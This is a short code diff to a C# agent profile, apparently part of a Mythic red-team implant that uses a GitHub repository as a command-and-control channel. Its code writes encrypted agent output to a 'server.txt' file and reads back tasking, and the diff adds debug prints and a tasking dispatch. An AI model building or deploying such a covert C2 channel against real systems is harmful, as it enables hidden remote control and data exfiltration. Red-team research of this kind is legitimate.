@@ -109,7 +109,8 @@ namespace Agent.Profiles
                 try
                 {
                     string message = this.crypt.Encrypt(await messageManager.GetAgentResponseStringAsync());
-                    //Console.WriteLine(message);
+                    Console.WriteLine("Message to Mythic!");
+                    Console.WriteLine(message);
                     var createRequest = new CreateFileRequest(agentConfig.uuid, message, agentConfig.uuid);
                     var result = await client.Repository.Content.CreateFile(OWNER, REPO, "server.txt", createRequest);
                     agentSha = result.Commit.Sha;
@@ -156,7 +157,13 @@ namespace Agent.Profiles
 
                     if (mythResp.Substring(0, 36) == agentConfig.uuid)
                     {
+                        Console.WriteLine(mythResp.Substring(36));
                         GetTaskingResponse gtr = JsonSerializer.Deserialize(mythResp.Substring(36), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                        if (gtr != null)
+                        {
+                            TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+                            this.SetTaskingReceived(null, tra);
+                        }
                     }
                 }
                 catch (NotFoundException)
